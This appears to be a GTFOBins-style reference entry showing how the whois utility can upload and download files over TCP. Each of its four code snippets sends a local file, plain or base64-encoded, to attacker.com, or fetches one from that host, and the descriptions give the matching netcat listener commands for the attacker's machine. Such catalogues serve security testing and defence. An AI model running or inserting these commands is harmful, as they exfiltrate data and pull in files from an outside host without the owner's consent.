---
description: |
  `whois` hangs waiting for the remote peer to close the socket.
functions:
  file-upload:
    - description: Send a text file to a TCP port. Run `nc -l -p 12345 > "file_to_save"` on the attacker box to collect the file. The file has a trailing `$'\x0d\x0a'` and its length is limited by the maximum size of arguments.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        whois -h $RHOST -p $RPORT "`cat $LFILE`"
    - description: Send a binary file to a TCP port. Run `nc -l -p 12345 | tr -d $'\x0d' | base64 -d > "file_to_save"` on the attacker box to collect the file. The file length is limited by the maximum size of arguments.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_send
        whois -h $RHOST -p $RPORT "`base64 $LFILE`"
  file-download:
    - description: Fetch remote text file from a remote TCP port. Run `nc -l -p 12345 < "file_to_send"` on the attacker box to send the file. The file has instances of `$'\x0d'` stripped.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        whois -h $RHOST -p $RPORT > "$LFILE"
    - description: Fetch remote binary file from a remote TCP port. Run `base64 "file_to_send" | nc -l -p 12345` on the attacker box to send the file.
      code: |
        RHOST=attacker.com
        RPORT=12345
        LFILE=file_to_save
        whois -h $RHOST -p $RPORT | base64 -d > "$LFILE"
---
